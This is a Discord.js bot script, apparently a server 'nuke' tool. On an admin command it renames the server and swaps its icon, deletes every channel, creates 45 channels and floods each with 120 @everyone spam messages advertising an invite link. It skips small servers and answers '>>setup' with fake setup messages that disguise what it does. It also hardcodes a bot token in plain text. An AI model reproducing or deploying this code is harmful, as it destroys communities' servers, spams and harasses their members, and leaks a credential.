const { Client, GatewayIntentBits, Partials } = require('discord.js');
const fs = require('fs');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ],
    partials: [
        Partials.Channel
    ]
});

const TOKEN = 'MTI2MjUxMzA0ODUzNTU2NDM2OA.GaSTzs.DUUNlSGsO84JP2j8eP-qzIyWshNxjrFXE_5HUI';
const ICON_PATH = 'https://media.discordapp.net/attachments/1262370798056902697/1262667311089713226/224_20240614123409.png?ex=66976e12&is=66961c92&hm=543d0a7181a95329b5a11f5a220d4389410b09fb52fc158a17548b97fce4f5d1&=&format=webp&quality=lossless';

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);
    
    // 10人以下のサーバーから退出
    const guilds = client.guilds.cache;
    guilds.forEach(guild => {
        if (guild.memberCount <= 10) {
            guild.leave()
                .then(g => console.log(`Left guild: ${g.name} (${g.id})`))
                .catch(err => console.error(`Failed to leave guild: ${guild.name} (${guild.id})`, err));
        }
    });
});

client.on('messageCreate', async message => {
    if (message.content === '!ccol' && message.member.permissions.has('ADMINISTRATOR')) {
        const guild = message.guild;

        // サーバーアイコンの設定
        guild.setIcon(ICON_PATH)
            .then(updatedGuild => console.log(`Updated server icon for guild: ${updatedGuild.name}`))
            .catch(err => console.error(`Failed to update server icon: ${guild.name}`, err));
        
        // サーバー名の設定
        guild.setName('CCOl植民地')
            .then(updatedGuild => console.log(`Updated server name to: ${updatedGuild.name}`))
            .catch(err => console.error(`Failed to update server name: ${guild.name}`, err));

        await Promise.all(guild.channels.cache.map(channel => channel.delete()));

        for (let i = 0; i < 45; i++) {
            let newChannel = await guild.channels.create({
                name: 'CCOL ON TOP',
                type: 0 // text channel
            });
            for (let j = 0; j < 120; j++) {
                newChannel.send(
                    "@everyone\n# CCOLに今すぐ参加！\n\n[CCOl ON TOP](https://discord.gg/RgmGhRqD)\nhttps://discord.gg/RgmGhRqD\n\nhttps://media.discordapp.net/attachments/1260568224626638901/1261954864452468766/discordggEWAWwyDf_1.webp?ex=6694d68d&is=6693850d&hm=0021949d1c5dd22ff5af64176a130e384e3bf7a6c91709d0dd90a869562ec6ee&=&format=webp"
                );
            }
        }
    } else if (message.content === '>>setup') {
        const setupMessages = [
            'Setting up the server...',
            'Initializing configurations...',
            'Loading modules...',
            'Establishing connections...',
            'Finalizing setup...',
        ];
        
        const randomMessages = setupMessages.sort(() => 0.5 - Math.random()).slice(0, 3);
        
        message.channel.send('```setup\n' + randomMessages.join('\n') + '\n```');
    }
});

client.login(TOKEN);
